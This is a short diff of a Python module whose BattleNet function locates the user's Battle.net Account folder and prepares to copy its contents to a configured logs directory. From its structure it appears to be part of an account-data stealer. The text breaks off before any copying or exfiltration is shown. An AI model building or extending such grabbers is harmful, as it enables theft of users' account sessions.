@@ -1,11 +1,11 @@
-from os import sep,environ,makedirs,path
+from os import environ,makedirs,path
 from shutil import copytree, copy2
 from manager.logger import Log
 from preferences.config import config
 
 def BattleNet():
     pathtofile = config.pathToLogs
-    local = environ['USERPROFILE'] + sep + r'AppData\Local'
+    local = environ["LOCALAPPDATA"]
     msgInfo = ""
     if path.exists(f"{local}\\Battle.net\\Account"):
         folders= [
